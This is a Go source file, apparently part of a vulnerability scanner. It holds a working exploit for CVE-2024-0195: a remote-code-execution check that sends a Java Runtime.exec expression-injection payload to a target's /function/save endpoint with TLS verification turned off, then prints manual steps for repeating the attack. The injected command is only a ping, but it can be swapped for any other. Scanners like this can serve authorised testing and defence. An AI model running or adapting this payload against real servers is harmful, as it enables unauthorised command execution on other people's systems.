package CVEs

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"strings"
	"time"
)

func CVE_2024_0195(url string, Attack bool) error {
	payload := "id=1&name=cmd&parameter=rce&script=%7DJava.type('java.lang.Runtime').getRuntime().exec('ping 127.0.0.1')%3B%7B"

	// 创建自定义的 Transport(禁用SSL)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	url1 := fmt.Sprintf("%s/function/save", url)
	//fmt.Println("test")
	request, err := http.NewRequest("POST", url1, strings.NewReader(payload))
	request.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	request.Header.Add("Content-Length", fmt.Sprint(strings.NewReader(payload).Len()))
	if err != nil {

	}
	response, err := client.Do(request)
	if err != nil {
		return err
	}
	defer response.Body.Close()

	contentLength := response.Header.Get("Content-Length")

	if response.StatusCode == http.StatusOK && contentLength == "0" {
		fmt.Println("[*]CVE-2024-0195 : " + url)
		if Attack {
			fmt.Println("Attack-Result : " + fmt.Sprintf("该漏洞无回显，请使用POST方法在%s下传入请求体数据：id=1&name=cmd&parameter=rce&script=%%7DJava.type('java.lang.Runtime').getRuntime().exec('ping 127.0.0.1')%%3B%%7B\n", url1))
		}
	}

	return nil
}
